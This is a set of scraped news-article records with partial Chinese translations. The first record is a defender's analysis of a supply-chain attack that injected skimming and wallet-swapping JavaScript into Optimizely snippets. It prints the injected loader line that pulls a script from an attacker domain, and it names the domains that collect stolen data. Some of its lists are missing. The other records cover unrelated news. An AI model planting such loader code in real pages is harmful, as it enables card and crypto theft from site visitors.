article_content:
On 16 November 2026, malicious JavaScript was served to visitors of 178 organisations through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world: Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock.

The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the Coruna and DarkSword iOS exploit kits. Crypto has already been stolen, with verified transactions to the attackers.

This is exactly the kind of attack Report URI is designed to detect. Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded.

The important lesson here is that trusted JavaScript doesn't always remain trustworthy. A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.

Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on.

Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example https://cdn.optimizely.com/js/6395285578973184.js. The snippet contains Optimizely's code, the customer's experiments and an optional field called Project JavaScript (projectJS): custom code the customer writes in their Optimizely dashboard, which runs on every page.

The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from cdn.optimizely.com, with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet:

"projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();

Some customers serve their snippet from their own domain, such as opt.scheels.com/js/<id>.js or www.vodafone.com.au/js/<id>.js. Those were affected too, because the content comes from the same Optimizely project.

We don't know how the attacker got write access to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for www.optimizely.com and login.optimizely.com both carried the code.

The payload was rebuilt 26 times during the day. The attacker added features, and added wallets but never removed any.

Every visitor received the same script, track.js, and every part of it was active at once. What a visitor experienced depended on their device and what they did on the page.

The script finds any valid wallet address (BTC, ETH and EVM chains, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin) and replaces it with one of the attacker's. It validates checksums so it only swaps real addresses. It swaps them in:

It re-scans the page whenever it changes. Copy an address from any affected page, or from anywhere else while that tab is open, and you may paste the attacker's.

Added at 13:43 UTC. The script watches form submissions and every fetch/XHR POST for a card number (Luhn-checked), expiry date and CVV. When it has all three, it sends them to https://1688360.cc/card.php with navigator.sendBeacon. Cards entered in hosted payment iframes (Stripe, Adyen and similar) were out of its reach. Cards typed into a site's own form fields were not.

When it swaps an address next to wallet or payment wording, it sends the following to https://1688360.cc/hit.php:

On iPhones and iPads the script loads boot.js from 5vobauua3ojpklx.icu and eil786npto9u5bq.icu. It reads the iOS version and loads an exploit chain in a hidden iframe:

The Coruna loader is byte-identical to a sample we analysed in October from a different campaign. The kit's own comments say iOS 18.7.3 and later, and 26.3 and later, are patched. Pages on iOS 18.6 or earlier reload every 60 seconds to retry the exploit, which is a visible symptom.

Funds were swept out at 13:03 to 13:05 UTC. The USDC on Ethereum went to a HitBTC deposit address. The TRON wallet has been in use since March 2026, so this actor was active long before this campaign. We cannot see how many cards or cookies reached 1688360.cc.

We fetched 1,611 distinct Optimizely snippets, found mostly through our own crawl data, and checked each one for the malicious code. 188 snippets belonging to 178 organisations were infected. We kept a copy of every infected file, along with its response headers, SHA-256 hash and fetch time as evidence. The real number is likely higher as we could only check snippets we could find in time.

Ranked by Tranco position within each sector and the status at 21:52 UTC: every snippet except TalkTalk's had been cleaned.

The earlier webshell.lol wave, through Kissmetrics, StorifyMe and Minute Media, affected other sites and isn't included above.

It's possible to go even further and deploy a CSP that could actively block these attacks and prevent any data breach happening. The websites affected by this attack weren't necessarily running vulnerable code of their own, they were loading JavaScript from a provider they trusted, and that trust was exploited. This is why monitoring what runs in your visitors' browsers is so important. Report URI gives organisations the visibility to detect when trusted dependencies change or behave unexpectedly, and the tools to help enforce policies that prevent malicious scripts and connections from succeeding.

Allowing cdn.optimizely.com was never going to help. The malicious code arrived from the trusted host itself. What separated the 24 protected sites from the rest was a restrictive script-src. A site that lists only the hosts it needs blocks 1688360.cc. Two common settings let it straight through:

connect-src matters. The 17 "partial" sites blocked card, cookie and screenshot theft because they restrict where the page can send data. That doesn't stop address swapping, which happens inside the page.

All of these domains are attacker-owned; block them including subdomains.

We keep an archive of every infected snippet with hashes and timestamps, and can share it with affected organisations and CERTs on request. During research and investigation, once we were confident that Optimizely was the source, we began efforts to reach out via various channels and provide the full details. At the time of publication, we have not had any response.

article_content_zh:
2026 年 11 月 16 日，恶意 JavaScript 通过 Optimizely Web 实验平台向 178 个组织的访问者提供。该列表包括一些世界上访问量最大的网站：Zoom、BBC、CNN、Salesforce、GitLab、IKEA、HSBC、Equifax、Air France-KLM、Ledger 和 Peacock。

该恶意软件是一个多用途工具包。它将加密货币钱包地址交换为攻击者的地址，浏览支付卡，窃取 cookie 和屏幕截图，并在 iPhone 和 iPad 上提供 Coruna 和 DarkSword iOS 漏洞利用套件。加密货币已经被盗，攻击者已验证交易。

这正是 Report URI 旨在检测的攻击类型。我们的平台可以识别受信任 JavaScript 的意外更改、检测正在加载的新脚本并揭示与外部目的地的可疑连接。在这种情况下，即使原始脚本是由受信任的 Optimizely 域提供的，这些信号也会暴露恶意活动。通过适当的 CSP 执行模式，组织可以更进一步，在攻击成功之前阻止其关键部分。

这里重要的教训是，受信任的 JavaScript 并不总是值得信赖的。网站可能会因第三方依赖而受到损害，而其自身的代码或基础设施却不会被破坏。

大多数恶意代码现已被删除。截至世界标准时间 21:52，我们仅在 188 个受感染片段中的 1 个中发现了该病毒，低于世界标准时间 20:56 的 169 个。如果您的网站使用 Optimizely Web，或者您今天访问了以下任何网站，请继续阅读。

Optimizely Web 的工作原理是让每个客户从 Optimizely 的 CDN 加载 JavaScript“片段”，例如 https://cdn.optimizely.com/js/6395285578973184.js。该代码片段包含 Optimizely 的代码、客户的实验和一个名为 Project JavaScript (projectJS) 的可选字段：客户在其 Optimizely 仪表板中编写的自定义代码，该仪表板在每个页面上运行。

攻击者将自己的代码写入客户项目的项目 JavaScript 中，每个片段的其余部分未受影响。该文件仍然由 cdn.optimizely.com 提供，带有 Optimizely 的证书，来自每个受影响站点都已信任的主机。以下是 Zoom 代码片段中添加的内容：

有些客户从自己的域提供代码片段，例如 opt.scheels.com/js/<id>.js 或 www.vodafone.com.au/js/<id>.js。这些也受到影响，因为内容来自同一个 Optimizely 项目。

我们不知道攻击者如何获得对如此多不相关的客户项目的写入权限：受损的 Optimizely 系统、受损的跨客户访问凭据或其他内容。这是由Optimizely 来解释的。需要明确的是，Optimizely 的 CDN 完全满足了它的要求；这不是 CDN 缓存中毒攻击。 Optimizely 自己的网站也受到了影响：www.optimizely.com 和 login.optimizely.com 的片段都携带了该代码。

一天之内，有效载荷被重建了 26 次。攻击者添加了功能，并添加了钱包，但从未删除过任何内容。

每个访问者都会收到相同的脚本 track.js，并且它的每个部分都立即处于活动状态。访问者的体验取决于他们的设备以及他们在页面上执行的操作。

title: Tech leaders are convinced that Jensen Huang’s exit was a plot against him
title_en: Tech leaders are convinced that Jensen Huang’s exit was a plot against him

inline_images.caption: FRANCE-US-TECHNOLOGY-NVIDIA-PORTRAIT
inline_images.alt: FRANCE-US-TECHNOLOGY-NVIDIA-PORTRAIT

author: Emma Roth
article_content:
Jensen Huang’s stunning resignation from Nvidia after more than 33 years has sent shockwaves throughout the tech industry. Now prominent figures are calling for Huang’s reinstatement, and many are also hopping on board with a theory spreading throughout Silicon Valley: that the scandal is the result of a plot against the former CEO.

At the center of this theory is the reporting from The New York Times that former Megaspeed executive Alice Huang, one of multiple women Huang is accused of having an affair with, is a Chinese spy. US agencies haven’t confirmed whether this is the case, and President Donald Trump claims he was unaware of any spy allegations. Jensen Huang’s alleged relationship with Alice Huang set off the events that led to his resignation; subsequent reporting suggested he had an affair with two employees at Nvidia, including one of his direct reports. The revelation raised new questions around whether Nvidia customers, including Megaspeed, were funneling chips to China in circumvention of export restrictions. Last year, Nvidia intervened in a chip-smuggling probe surrounding the Singapore-based company, according to Bloomberg.

David Sacks, a venture capitalist and former White House AI crypto advisor, has made it clear that he’s skeptical about The New York Times’ reporting. In a post on X, Sacks points to an article from CNN, which says US officials still can’t confirm that Alice Huang was a spy. “The spy narrative is collapsing already,” Sacks writes. He continued to question the spy allegations during Semafor’s Silicon Valley & The World event on Monday, saying: “The reason why Jensen lost his job is because of this lurid Chinese spy allegation. So if no one’s willing to back that up now, then again, I question why this entire chain of events happened.”

Epic Games CEO Tim Sweeney similarly expressed concern about how Huang’s resignation played out. In a reply to Sacks’ post about the CNN article, Sweeney said, “What?! So journalists with sketchy motives portrayed rumors from god-knows-who (lobbyists?) as facts sourced from intelligence officials and gaslit the NVIDIA board to push out the founder, CEO, and once-in-generation visionary?” Amjad Masad, the CEO of the AI app and website builder Replit, called the timing of Huang’s resignation “suspicious,” adding that “if Jensen, the premier champion of open models, is taken out then anyone who wants AI closed, centralized, and controlled might benefit.”

SemiAnalysis, a research and consulting firm for the semiconductor and AI industry, posted a “conspiracy theory take on the situation,” speculating that Huang’s removal is a way to “remove opposition to an extremely hawkish China export control bill,” referring to the Remote Access Security Act (RASA). The bill, which Huang opposed, would extend AI export controls to cloud servers that allow companies in restricted countries to rent access to Nvidia’s AI chips. The Department of Commerce released an interim final rule on Monday in an attempt to address this loophole.

More than 185,000 people, including Sweeney, Masad, Elon Musk, Uber co-founder Travis Kalanick, Y Combinator CEO Garry Tan, and Shopify CEO Tobias Lütke, have signed a “Stand with Jensen” letter, calling for his reinstatement as CEO. The letter similarly calls for a closer look into the circumstances surrounding Huang’s resignation. “We have not been shown evidence substantiating the allegation that the woman at the center of this controversy was a spy,” the letter says. “Suspicion or association alone is not a sufficient basis for ending Jensen’s leadership. The inquiry must establish the facts, not merely justify an outcome already imposed.”

article_content_zh:
黄仁勋在 Nvidia 工作了 33 年多后令人震惊地辞职，这在整个科技行业引起了震动。现在，知名人士呼吁黄仁勋复职，许多人也纷纷接受硅谷流传的一种理论：该丑闻是针对前首席执行官的阴谋的结果。

这一理论的核心是《纽约时报》的报道称，Megaspeed 前高管爱丽丝·黄 (Alice Huang) 是一名中国间谍，黄被指控与多名女性有染。美国机构尚未证实情况是否如此，唐纳德·特朗普总统声称他不知道任何间谍指控。黄仁勋涉嫌与黄爱丽的关系引发了导致他辞职的事件；随后的报道显示，他与英伟达的两名员工有染，其中包括他的一名直接下属。这一消息引发了新的问题：包括 Megaspeed 在内的 Nvidia 客户是否正在向中国输送芯片以规避出口限制。据彭博社报道，去年，英伟达介入了围绕这家新加坡公司的芯片走私调查。

风险投资家、前白宫人工智能加密货币顾问戴维·萨克斯 (David Sacks) 明确表示，他对《纽约时报》的报道持怀疑态度。在 X 上的一篇帖子中，萨克斯提到了 CNN 的一篇文章，该文章称美国官员仍无法确认爱丽丝·黄 (Alice Huang) 是间谍。 “间谍叙事已经崩溃，”萨克斯写道。周一，他在 Semafor 的《硅谷与世界》活动期间继续质疑间谍指控，并表示：“詹森丢掉工作的原因是因为这一耸人听闻的中国间谍指控。因此，如果现在没有人愿意支持这一点，那么我再次质疑为什么会发生这整个链条事件。”

Epic Games 首席执行官蒂姆·斯威尼 (Tim Sweeney) 同样对黄仁勋的辞职结果表示担忧。在回复 Sacks 关于 CNN 文章的帖子时，斯威尼说道：“什么？！所以动机不明的记者将来自天知道谁（游说者？）的谣言描绘成来自情报官员的事实，并对 NVIDIA 董事会施加压力，将这位创始人、首席执行官和一代人的梦想家赶下台？”人工智能应用程序和网站建设者 Replit 的首席执行官阿姆贾德·马萨德 (Amjad Masad) 称黄仁勋的辞职时机“可疑”，并补充道，“如果开放模型的首要拥护者詹森被赶下台，那么任何希望人工智能封闭、集中和受控的人都可能受益。”

半导体和人工智能行业的研究和咨询公司 SemiAnalysis 发布了一份“对这种情况的阴谋论看法”，推测黄的罢免是为了“消除对极其鹰派的中国出口管制法案的反对”，指的是《远程访问安全法案》(RASA)。黄仁勋反对的这项法案将把人工智能出口管制扩大到云服务器，允许受限制国家的公司租用英伟达的人工智能芯片。美国商务部周一发布了一项临时最终规则，试图解决这一漏洞。

包括 Sweeney、Masad、Elon Musk、Uber 联合创始人 Travis Kalanick、Y Combinator 首席执行官 Garry Tan 和 Shopify 首席执行官 Tobias Lütke 在内的超过 185,000 人签署了一封“与 Jensen 站在一起”的信，呼吁恢复他的首席执行官职位。这封信同样要求对黄辞职的情况进行更仔细的调查。信中称：“我们尚未获得证据证明处于这场争议中心的女性是间谍的指控。” “仅仅怀疑或关联并不足以结束詹森的领导地位。调查必须查明事实，而不仅仅是证明已经强加的结果是合理的。”

title: United Airlines resolves system outage that affected departing flights
title_en: United Airlines resolves system outage that affected departing flights
author: Michele Luhn
article_content:
United Airlines on Monday said it had resolved a "widespread system outage"that briefly affected departing flights.

"We have resolved a technology issue that delayed flight departures,"the airline said in a statement. "While some flights were delayed, there was no impact on flights in progress, or on United Express flights.

A United spokesperson said there was no indication that the outage was a cyberattack.

The Air Line Pilots Association, which represents pilots for United and other carriers, said in an earlier message to members seen by CNBC that the operational outage was "affecting multiple pilot facing applications"and that United could not "provide outbound flights with final weights."

United's outage came three days after a nationwide ground stop halted departures across the country for more than four hours, snarling travel and leading to widespread delays and cancellations over the weekend.

Transportation Secretary Sean Duffy blamed the issues that led to Friday's ground stop on a router in Arkansas that overwhelmed systems that feed radar and other data for air traffic control. Federal Aviation Administration Administrator Bryan Bedford said the upgrades were part of "routine"maintenance to switch over from copper wires to fiber optic.

There were significantly fewer flight delays and cancellations Monday than had been reported Sunday, according to FlightAware data.

There was no indication that United's outage Monday was related to the issues that caused Friday's ground stop.

— CNBC's Leslie Josephs and Phil LeBeau contributed to this report.

The airline stated there is no evidence of a cyberattack, and the issue does not affect flights currently in progress or United Express regional operations.
title_zh: 美国联合航空解决了影响离港航班的系统中断问题

article_content_zh:
美国联合航空公司周一报告称，“大范围的系统中断”正在影响离港航班。

该航空公司在一份声明中表示：“我们正在解决影响离港航班的技术问题。” “这对正在进行的航班或联合快运航班没有影响。”

美联航发言人表示，没有迹象表明此次故障是网络攻击造成的。

曼联在 X 上的一篇帖子中表示，其团队“正在努力让一切尽快恢复正常运行”。该航空公司要求旅客检查航班状态以获取更新。

代表美联航和其他航空公司飞行员的航空公司飞行员协会在 CNBC 看到的发给会员的消息中表示，运营中断“影响了多名飞行员面临的申请”，美联航无法“提供出境航班​​的最终重量”。

联合航空停运三天前，全国各地的航班停飞了四个多小时，导致旅行陷入困境，并导致周末出现大范围的航班延误和取消。

交通部长肖恩·达菲 (Sean Duffy) 将导致周五地面停车的问题归咎于阿肯色州的一个路由器，该路由器淹没了为空中交通管制提供雷达和其他数据的系统。美国联邦航空局局长布莱恩·贝德福德表示，升级是从铜线切换到光纤的“例行”维护的一部分。

根据 FlightAware 的数据，周一的航班延误和取消数量明显少于周日的报告。

— CNBC 的莱斯利·约瑟夫斯 (Leslie Josephs) 和菲尔·勒博 (Phil LeBeau) 对本报告做出了贡献。

article_content_en:
United Airlines on Monday said it had resolved a "widespread system outage"that briefly affected departing flights.

"We have resolved a technology issue that delayed flight departures,"the airline said in a statement. "While some flights were delayed, there was no impact on flights in progress, or on United Express flights.

A United spokesperson said there was no indication that the outage was a cyberattack.

The Air Line Pilots Association, which represents pilots for United and other carriers, said in an earlier message to members seen by CNBC that the operational outage was "affecting multiple pilot facing applications"and that United could not "provide outbound flights with final weights."

United's outage came three days after a nationwide ground stop halted departures across the country for more than four hours, snarling travel and leading to widespread delays and cancellations over the weekend.

Transportation Secretary Sean Duffy blamed the issues that led to Friday's ground stop on a router in Arkansas that overwhelmed systems that feed radar and other data for air traffic control. Federal Aviation Administration Administrator Bryan Bedford said the upgrades were part of "routine"maintenance to switch over from copper wires to fiber optic.

There were significantly fewer flight delays and cancellations Monday than had been reported Sunday, according to FlightAware data.

There was no indication that United's outage Monday was related to the issues that caused Friday's ground stop.

— CNBC's Leslie Josephs and Phil LeBeau contributed to this report.

title: US judge clears MIT-educated brothers of $25 million cryptocurrency heist charges
title_en: US judge clears MIT-educated brothers of $25 million cryptocurrency heist charges

inline_images.caption: Judge Acquits MIT Brothers in $25 Million Ethereum Exploit Case (Photo: REUTERS)
inline_images.caption_en: Judge Acquits MIT Brothers in $25 Million Ethereum Exploit Case (Photo: REUTERS)
inline_images.caption_zh: Judge Acquits MIT Brothers in $25 Million Ethereum Exploit Case (摄影：路透社)
inline_images.alt: Judge Acquits MIT Brothers in $25 Million Ethereum Exploit Case

author: Nate Raymond/Reuters
article_content:
U.S. District Judge Jessica Clarke granted a judgment of acquittal for Anton Peraire-Bueno and James Peraire-Bueno on November 16, 2026, ending a prosecution that tested whether exploiting vulnerabilities in decentralized blockchain trading infrastructure could constitute criminal fraud.

The decision follows a November 2025 mistrial, when jurors could not reach a unanimous verdict after nearly four weeks of testimony. Prosecutors subsequently sought another trial, but Clarke concluded that the evidence presented could not legally support convictions for wire fraud, conspiracy to commit wire fraud or conspiracy to commit money laundering.

The central issue was whether the brothers made materially false representations when executing a trading strategy that exploited Ethereum‘s transaction-ordering infrastructure.

Prosecutors alleged that the brothers manipulated the system used to construct and validate Ethereum transactions, allowing them to intercept private trading information and replace transactions submitted by automated trading bots.

Clarke concluded that the government had not demonstrated that the brothers made a legally actionable misrepresentation during the operation.

The judge examined whether registering a validator, requesting transaction blocks, submitting invalid block information or proposing modified transactions constituted deceptive representations. She found that none of those actions established the necessary element of wire fraud.

The ruling also rejected the argument that violating the intended design of the MEV-Boost system was sufficient to establish criminal deception.

The judge distinguished between potentially objectionable trading behavior and conduct prohibited by the specific criminal statutes under which the brothers were charged.

Because the money laundering conspiracy charge depended on the proceeds of the alleged wire fraud, the failure of the underlying fraud case also required acquittal on that charge.

As FinanceFeeds previously reported, prosecutors had challenged efforts by the DeFi Education Fund to submit arguments concerning the wider implications of criminalizing blockchain trading strategies.

The ruling limits the government’s ability to prosecute this particular blockchain exploit under traditional wire fraud provisions without evidence of material deception. However, the decision does not establish that exploiting software vulnerabilities is universally lawful or prevent enforcement under other applicable statutes.

The case originated from an April 2023 operation involving maximal extractable value, or MEV, a mechanism through which traders and validators can profit from the ordering of blockchain transactions.

Ethereum validators are responsible for proposing transaction blocks, while specialized builders assemble transactions to maximize potential returns. MEV-Boost, open-source software introduced by Flashbots, allows validators to outsource block construction through intermediaries known as relays.

Prosecutors alleged that the Peraire-Bueno brothers identified a vulnerability in this arrangement and developed a strategy called Omakase to target automated traders conducting sandwich transactions.

Sandwich trading involves placing transactions immediately before and after another trader’s order to profit from changes in the asset’s price.

According to the trial evidence, the brothers created transactions designed to attract these automated strategies. They then exploited a relay vulnerability to access transaction information that the bots expected to remain private before submitting replacement transactions.

The operation generated approximately $25 million in profits within a single Ethereum block.

The brothers were indicted in May 2024. Prosecutors maintained that the operation amounted to fraud, while defense lawyers argued that their clients had executed a trading strategy without making false representations or violating applicable trading rules.

Following the deadlocked jury, prosecutors requested a retrial for early 2026. The defense instead pursued a judgment of acquittal, which Clarke ultimately granted.

The case demonstrates that technical vulnerabilities in transaction-ordering systems can expose sophisticated trading operations to substantial losses. For institutional DeFi participants, protections around private transaction information and relay infrastructure remain important regardless of whether a particular exploit meets the legal definition of fraud.

The decision adds to a series of federal court rulings examining whether unconventional decentralized trading strategies can be prosecuted under existing financial fraud statutes.

In May 2025, another Manhattan federal judge overturned fraud and market manipulation convictions against Mango Markets trader Avraham Eisenberg, whose trading strategy extracted approximately $110 million from the Solana-based decentralized finance platform.

That ruling involved separate questions concerning jurisdiction, market rules and whether the defendant’s transactions amounted to fraudulent representations.

Clarke’s decision likewise focused on the legal requirements for proving deception rather than determining whether the trading strategy was commercially acceptable.

The similarities do not make the cases interchangeable. Both decisions arose from their particular facts, charges and trial records, and neither creates a general exemption for blockchain manipulation.

RelatedTrump Meme Coin Dinner Draws 94% Less Investment as Token Crashes to 92 Cents

The November 16 judgment closes the criminal case against the Peraire-Bueno brothers in the Southern District of New York, eliminating the retrial prosecutors had previously sought.

The decision may also inform future arguments about how fraud statutes apply to automated trading, transaction ordering and decentralized market infrastructure.

For prosecutors, the ruling demonstrates the importance of identifying specific deceptive conduct rather than relying solely on evidence that a trading strategy violated a system’s expected operation.

For blockchain developers, exchanges and institutional trading firms, the distinction between software specifications, enforceable contractual obligations and criminal law remains central to assessing operational and legal risk.

The acquittal removes immediate criminal exposure for the two defendants but leaves broader questions about MEV-related market conduct unresolved. Institutional participants still need to assess smart-contract security, counterparty exposure and the legal treatment of their trading activities independently of this ruling.

title_zh: 美国法官宣判麻省理工出身的两兄弟 2500 万美元加密货币盗窃案无罪
summary_zh: 曼哈顿美国联邦法官杰西卡·克拉克裁定，被控利用以太坊 MEV-Boost 软件漏洞在 12 秒内截获 2500 万美元的两名 MIT 毕业兄弟无罪。法官指出，其套利交易不存在重大虚假陈述，且未发生在受监管受限市场，检方指控无法构成电汇欺诈
article_content_zh:
美国地区法官 Jessica Clarke 于 2026 年 11 月 16 日做出 Anton Peraire-Bueno 和 James Peraire-Bueno 无罪判决，结束了一项测试利用去中心化区块链交易基础设施漏洞是否构成刑事欺诈的起诉。

该决定是在 2025 年 11 月的一次无效审判之后作出的，当时陪审团在经过近四个星期的证词后未能达成一致裁决。检察官随后寻求再次审判，但克拉克得出的结论是，所提供的证据不能在法律上支持对电信欺诈、串谋实施电信欺诈或串谋洗钱的定罪。

核心问题是兄弟俩在执行利用以太坊交易排序基础设施的交易策略时是否做出了重大虚假陈述。

检察官指控兄弟俩操纵了用于构建和验证以太坊交易的系统，使他们能够拦截私人交易信息并替换自动交易机器人提交的交易。

克拉克的结论是，政府没有证明兄弟俩在行动期间做出了可采取法律行动的虚假陈述。

法官审查了注册验证者、请求交易区块、提交无效区块信息或提出修改交易是否构成欺骗性陈述。她发现这些行为均不构成电汇欺诈的必要要素。

该裁决还驳回了违反 MEV-Boost 系统的预期设计足以构成刑事欺骗的论点。

法官区分了可能令人反感的交易行为和两兄弟受到指控的具体刑事法规所禁止的行为。

由于洗钱共谋指控取决于涉嫌电汇欺诈的收益，因此基础欺诈案件的失败也要求该指控被无罪释放。

正如 FinanceFeeds 之前报道的那样，检察官对 DeFi 教育基金提出的关于将区块链交易策略定为犯罪的更广泛影响的论据提出了质疑。

该裁决限制了政府在没有重大欺骗证据的情况下根据传统电汇欺诈条款起诉这一特定区块链漏洞的能力。然而，该决定并未确立利用软件漏洞普遍合法或阻止其他适用法规的执行。

该案件源于2023年4月的一次行动，涉及最大可提取价值（MEV），这是一种交易者和验证者可以通过区块链交易的排序来获利的机制。

以太坊验证者负责提出交易块，而专门的构建者组装交易以最大化潜在回报。MEV-Boost是Flashbots推出的开源软件，它允许验证者通过被称为中继的中介将区块构建外包。

检察官称，佩雷-布埃诺兄弟发现了这种安排中的一个漏洞，并制定了一项名为Omakase的策略，以进行三明治交易的自动交易员为目标。

三明治交易涉及在另一个交易者的订单之前和之后立即进行交易，以从资产价格的变化中获利。

根据审判证据，兄弟俩创建了旨在吸引这些自动化策略的交易。然后，他们利用中继漏洞来访问机器人希望在提交替换交易之前保持私密的交易信息。

该操作在单个以太坊区块内产生了约 2500 万美元的利润。

兄弟俩于 2024 年 5 月被起诉。检察官坚称，该行动构成欺诈，而辩护律师则辩称，他们的客户在没有做出虚假陈述或违反适用交易规则的情况下执行了交易策略。

陪审团陷入僵局后，检察官要求 2026 年初重审。辩方转而寻求无罪判决，克拉克最终批准了这一判决。

该案例表明，交易排序系统中的技术漏洞可能会使复杂的交易操作遭受重大损失。对于机构 DeFi 参与者来说，无论特定漏洞是否符合欺诈的法律定义，对私人交易信息和中继基础设施的保护仍然很重要。

该决定是联邦法院一系列裁决的补充，这些裁决审查非常规去中心化交易策略是否可以根据现有的金融欺诈法规受到起诉。

2025 年 5 月，另一位曼哈顿联邦法官推翻了对 Mango Markets 交易员 Avraham Eisenberg 的欺诈和市场操纵定罪，该交易策略从基于 Solana 的去中心化金融平台中提取了约 1.1 亿美元。

该裁决涉及管辖权、市场规则以及被告的交易是否构成欺诈性陈述等单独问题。

克拉克的决定同样侧重于证明欺骗的法律要求，而不是确定交易策略是否在商业上可接受。

这些相似之处并不意味着这些案例可以互换。这两项决定都是根据其特定的事实、指控和审判记录而做出的，两者都没有为区块链操纵创造一般豁免。

对于区块链开发商、交易所和机构交易公司来说，软件规范、可执行的合同义务和刑法之间的区别仍然是评估运营和法律风险的核心。

paragraphs: U.S. District Judge Jessica Clarke granted a judgment of acquittal for Anton Peraire-Bueno and James Peraire-Bueno on November 16, 2026, ending a prosecution that tested whether exploiting vulnerabilities in decentralized blockchain trading infrastructure could constitute criminal fraud.

The decision follows a November 2025 mistrial, when jurors could not reach a unanimous verdict after nearly four weeks of testimony. Prosecutors subsequently sought another trial, but Clarke concluded that the evidence presented could not legally support convictions for wire fraud, conspiracy to commit wire fraud or conspiracy to commit money laundering.
The central issue was whether the brothers made materially false representations when executing a trading strategy that exploited Ethereum‘s transaction-ordering infrastructure.

Prosecutors alleged that the brothers manipulated the system used to construct and validate Ethereum transactions, allowing them to intercept private trading information and replace transactions submitted by automated trading bots.
Clarke concluded that the government had not demonstrated that the brothers made a legally actionable misrepresentation during the operation.

The judge examined whether registering a validator, requesting transaction blocks, submitting invalid block information or proposing modified transactions constituted deceptive representations. She found that none of those actions established the necessary element of wire fraud.
The ruling also rejected the argument that violating the intended design of the MEV-Boost system was sufficient to establish criminal deception.
The judge distinguished between potentially objectionable trading behavior and conduct prohibited by the specific criminal statutes under which the brothers were charged.
Because the money laundering conspiracy charge depended on the proceeds of the alleged wire fraud, the failure of the underlying fraud case also required acquittal on that charge.

As FinanceFeeds previously reported, prosecutors had challenged efforts by the DeFi Education Fund to submit arguments concerning the wider implications of criminalizing blockchain trading strategies.

The ruling limits the government’s ability to prosecute this particular blockchain exploit under traditional wire fraud provisions without evidence of material deception. However, the decision does not establish that exploiting software vulnerabilities is universally lawful or prevent enforcement under other applicable statutes.
The case originated from an April 2023 operation involving maximal extractable value, or MEV, a mechanism through which traders and validators can profit from the ordering of blockchain transactions.

Ethereum validators are responsible for proposing transaction blocks, while specialized builders assemble transactions to maximize potential returns. MEV-Boost, open-source software introduced by Flashbots, allows validators to outsource block construction through intermediaries known as relays.

Prosecutors alleged that the Peraire-Bueno brothers identified a vulnerability in this arrangement and developed a strategy called Omakase to target automated traders conducting sandwich transactions.
Sandwich trading involves placing transactions immediately before and after another trader’s order to profit from changes in the asset’s price.

According to the trial evidence, the brothers created transactions designed to attract these automated strategies. They then exploited a relay vulnerability to access transaction information that the bots expected to remain private before submitting replacement transactions.
The operation generated approximately $25 million in profits within a single Ethereum block.

The brothers were indicted in May 2024. Prosecutors maintained that the operation amounted to fraud, while defense lawyers argued that their clients had executed a trading strategy without making false representations or violating applicable trading rules.
Following the deadlocked jury, prosecutors requested a retrial for early 2026. The defense instead pursued a judgment of acquittal, which Clarke ultimately granted.

The case demonstrates that technical vulnerabilities in transaction-ordering systems can expose sophisticated trading operations to substantial losses. For institutional DeFi participants, protections around private transaction information and relay infrastructure remain important regardless of whether a particular exploit meets the legal definition of fraud.
The decision adds to a series of federal court rulings examining whether unconventional decentralized trading strategies can be prosecuted under existing financial fraud statutes.

In May 2025, another Manhattan federal judge overturned fraud and market manipulation convictions against Mango Markets trader Avraham Eisenberg, whose trading strategy extracted approximately $110 million from the Solana-based decentralized finance platform.
That ruling involved separate questions concerning jurisdiction, market rules and whether the defendant’s transactions amounted to fraudulent representations.
Clarke’s decision likewise focused on the legal requirements for proving deception rather than determining whether the trading strategy was commercially acceptable.

The similarities do not make the cases interchangeable. Both decisions arose from their particular facts, charges and trial records, and neither creates a general exemption for blockchain manipulation.

The November 16 judgment closes the criminal case against the Peraire-Bueno brothers in the Southern District of New York, eliminating the retrial prosecutors had previously sought.
The decision may also inform future arguments about how fraud statutes apply to automated trading, transaction ordering and decentralized market infrastructure.

For prosecutors, the ruling demonstrates the importance of identifying specific deceptive conduct rather than relying solely on evidence that a trading strategy violated a system’s expected operation.

For blockchain developers, exchanges and institutional trading firms, the distinction between software specifications, enforceable contractual obligations and criminal law remains central to assessing operational and legal risk.

The acquittal removes immediate criminal exposure for the two defendants but leaves broader questions about MEV-related market conduct unresolved. Institutional participants still need to assess smart-contract security, counterparty exposure and the legal treatment of their trading activities independently of this ruling.
paragraphs_zh: 美国一名联邦法官周一裁定，被控在短短 12 秒内盗取 2500 万美元加密货币的两名麻省理工学院（MIT）毕业兄弟无罪。法官认定，检方未能证明利用软件漏洞获取资金的行为构成了欺诈罪。
曼哈顿美国地方法官杰西卡·克拉克（Jessica Clarke）做出了这一裁决。此前一年，陪审团在是否判定安东·佩雷尔-布埃诺（Anton Peraire-Bueno）和詹姆斯·佩雷尔-布埃诺（James Peraire-Bueno）有罪的问题上陷入僵局。这是联邦检察官首次对此类新型欺诈指控提起公诉。
检方此前指控，这两名身为计算机程序员的兄弟于 2023 年 4 月实施了一场超高速的“诱捕策略”，旨在将交易机器人引入陷阱，并抽干以太坊网络上其他加密货币交易者的账户。
然而克拉克法官表示，检方在审判中未能提供证据表明佩雷尔-布埃诺兄弟在利用软件漏洞实施其被控策略时做出了任何“重大不实陈述”（Material Misrepresentations）。法官指出，因此不能判定他们犯有电汇欺诈及其他相关罪名。
